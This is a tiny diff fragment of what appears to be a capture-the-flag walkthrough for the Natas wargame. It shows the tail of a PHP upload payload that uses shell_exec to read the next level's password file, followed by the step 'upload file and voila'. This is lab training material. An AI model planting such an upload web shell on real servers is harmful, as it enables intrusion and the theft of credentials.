@@ -8,4 +8,5 @@ $output = shell_exec('cat /etc/natas_webpass/natas14');
 echo $output;
  __halt_compiler();
  ?>```
+ 
  4. upload file and voila
